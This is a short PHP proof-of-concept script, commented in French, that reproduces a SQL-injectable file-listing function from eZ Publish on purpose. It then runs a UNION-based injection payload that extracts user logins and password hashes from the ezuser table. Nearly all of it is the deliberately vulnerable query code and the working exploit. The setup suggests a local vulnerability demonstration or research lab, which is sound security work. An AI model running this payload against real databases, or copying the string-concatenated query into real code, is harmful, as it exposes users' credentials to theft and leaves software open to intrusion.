<?php

$db = mysqli_connect('db', 'ezpublish', 'ezpublish', 'ezpublish');

if (!$db) {
    die("Connexion échouée : " . mysqli_connect_error() . "\n");
}

echo "Connexion MySQL OK\n\n";

function getFileList($db, $path) {
    $query = "SELECT name FROM ezdfsfile";
    
    if ($path != false) {
        // Reproduction exacte du code vulnérable
        $query .= " WHERE name LIKE '" . $path . "%'";
    }
    
    echo "[DEBUG] Requête : $query\n\n";
    
    $rslt = mysqli_query($db, $query);
    
    if (!$rslt) {
        die("Erreur SQL : " . mysqli_error($db) . "\n");
    }
    
    $filePathList = [];
    while ($row = mysqli_fetch_row($rslt)) {
        $filePathList[] = $row[0];
    }
    return $filePathList;
}

// Utilisation normale
echo "=== Utilisation normale ===\n";
$files = getFileList($db, 'var/storage/');
if (empty($files)) {
    echo "  (aucun fichier trouvé)\n";
} else {
    foreach ($files as $file) {
        echo "  - $file\n";
    }
}

// Exploitation
echo "\n=== Exploitation (UNION SQLi) ===\n";
$payload = "var/' UNION SELECT CONCAT(login,':',password_hash) FROM ezuser-- ";
$files = getFileList($db, $payload);
if (empty($files)) {
    echo "  (aucun résultat)\n";
} else {
    foreach ($files as $file) {
        echo "  - $file\n";
    }
}

mysqli_close($db);
